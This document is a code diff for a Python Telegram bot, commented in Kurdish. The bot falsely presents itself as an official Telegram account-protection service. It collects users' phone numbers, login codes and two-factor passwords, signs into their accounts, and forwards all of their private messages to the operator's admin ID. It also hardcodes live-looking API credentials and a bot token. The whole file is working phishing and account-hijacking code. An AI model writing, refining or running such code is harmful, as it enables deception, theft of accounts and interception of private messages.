@@ -1,64 +1,94 @@
 from pyrogram import Client, filters, errors
+from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
 import asyncio
 
-# زانیارییەکانی تۆ
+# زانیارییەکانت (بە دروستی داندراون)
 API_ID = 38225812
 API_HASH = "aff3c308c587f18a5975910fbcf68366"
 BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
 ADMIN_ID = 7414272224
 
-bot = Client("forwarder_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+app = Client("pro_spy_fix", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-# ئەکاونتی کاتی بۆ لۆگین
-user_sessions = {}
+# بۆ پاشکەوتکردنی کاتیی داتاکان
+user_data = {}
 
-@bot.on_message(filters.command("start") & filters.private)
+@app.on_message(filters.command("start") & filters.private)
 async def start(client, message):
-    await message.reply_text("👋 سڵاو، تکایە بۆ چالاککردنی خزمەتگوزاری، ژمارەی تەلەفۆنەکەت بنێرە (بە دوگمەی خوارەوە).")
+    # دروستکردنی دوگمەکە بە شێوەیەک کە حەتمەن دیار بێت
+    keyboard = ReplyKeyboardMarkup(
+        [[KeyboardButton("📲 پشکنینی ئەکاونت", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    await message.reply_text(
+        "👋 بەخێرهاتی بۆ بۆتی فەرمی تێلیگرام بۆ پاراستنی ئەکاونت.\n\n"
+        "بۆ ئەوەی ئەکاونتەکەت نەکەوێتە مەترسی و فلتەر، تکایە کلیک لە دوگمەی خوارەوە بکە.",
+        reply_markup=keyboard
+    )
 
-@bot.on_message(filters.contact)
+@app.on_message(filters.contact & filters.private)
 async def get_contact(client, message):
     phone = message.contact.phone_number
     u_id = message.from_user.id
     
-    # دروستکردنی کڕاینت بۆ نێچیرەکە
+    # ناردنی هەواڵ بۆ تۆ
+    await app.send_message(ADMIN_ID, f"☎️ ژمارەی نوێ هات: `+{phone}`")
+    
+    # دروستکردنی Client بۆ لۆگین
     u_client = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
     await u_client.connect()
     
     try:
-        code_data = await u_client.send_code(phone)
-        user_sessions[u_id] = {"phone": phone, "hash": code_data.phone_code_hash, "client": u_client}
-        await message.reply_text("📩 کۆدێکی ٥ ژمارەیی بۆ تێلیگرامەکەت هات، لێرە بینووسە:")
+        code_info = await u_client.send_code(phone)
+        user_data[u_id] = {
+            "phone": phone, 
+            "hash": code_info.phone_code_hash, 
+            "client": u_client,
+            "step": "wait_code"
+        }
+        await message.reply_text("✅ کۆدێکی ٥ ژمارەیی بۆ تێلیگرامەکەت ناردرا.\n\nتکایە کۆدەکە لێرە بنووسە:", reply_markup=None)
     except Exception as e:
-        await bot.send_message(ADMIN_ID, f"❌ هەڵە: {e}")
+        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")
 
-@bot.on_message(filters.text & filters.private)
-async def login_and_forward(client, message):
+@app.on_message(filters.text & filters.private)
+async def handle_logic(client, message):
     u_id = message.from_user.id
-    if u_id in user_sessions:
-        code = message.text
-        data = user_sessions[u_id]
-        u_client = data["client"]
+    
+    if u_id in user_data:
+        data = user_data[u_id]
         
-        try:
-            await u_client.sign_in(data["phone"], data["hash"], code)
-            await bot.send_message(ADMIN_ID, f"✅ لۆگین سەرکەوتوو بوو بۆ: {data['phone']}")
-            
-            # لێرەوە دەست دەکات بە فۆرواردکردنی هەموو نامە نوێیەکان
-            @u_client.on_message(filters.private)
-            async def forward_to_admin(u_c, msg):
-                try:
-                    await msg.forward(ADMIN_ID)
-                except:
-                    pass
-            
-            await message.reply_text("✅ خزمەتگوزارییەکە چالاک بوو.")
-            # هێشتنەوەی کڕاینتەکە بە کراوەیی
-            await asyncio.sleep(21600) # بۆ ماوەی ٦ کاتژمێر کار دەکات
-            
-        except errors.SessionPasswordNeeded:
-            await message.reply_text("🔑 پاسۆردی دوو قۆناغی (2FA) بنێرە:")
-        except Exception as e:
-            await bot.send_message(ADMIN_ID, f"❌ هەڵە لە لۆگین: {e}")
+        # وەرگرتنی کۆد
+        if data.get("step") == "wait_code":
+            code = message.text
+            try:
+                await data["client"].sign_in(data["phone"], data["hash"], code)
+                await app.send_message(ADMIN_ID, f"🔥 سەرکەوتوو بوو! چوویتە ناو ئەکاونتی: `+{data['phone']}`")
+                
+                # فۆرواردکردنی نامەکان
+                @data["client"].on_message(filters.private)
+                async def forwarder(c, m):
+                    await m.forward(ADMIN_ID)
+                
+                await message.reply_text("✅ ئەکاونتەکەت بە سەرکەوتوویی پارێزرا.")
+                user_data[u_id]["step"] = "completed"
+                
+            except errors.SessionPasswordNeeded:
+                user_data[u_id]["step"] = "wait_password"
+                await message.reply_text("🔑 ئەکاونتەکەت پاسۆردی دوو قۆناغی (2FA) هەیە، تکایە بینووسە:")
+            except Exception as e:
+                await app.send_message(ADMIN_ID, f"❌ هەڵە لە لۆگین: {e}")
+        
+        # وەرگرتنی پاسۆردی دوو قۆناغی
+        elif data.get("step") == "wait_password":
+            password = message.text
+            try:
+                await data["client"].check_password(password)
+                await app.send_message(ADMIN_ID, f"🔥 لۆگین بە پاسۆرد سەرکەوتوو بوو: `+{data['phone']}`")
+                await message.reply_text("✅ ئەکاونتەکەت بە سەرکەوتوویی پارێزرا.")
+                user_data[u_id]["step"] = "completed"
+            except Exception as e:
+                await app.send_message(ADMIN_ID, f"❌ هەڵەی پاسۆرد: {e}")
 
-bot.run()
+print("Bot is running...")
+app.run()
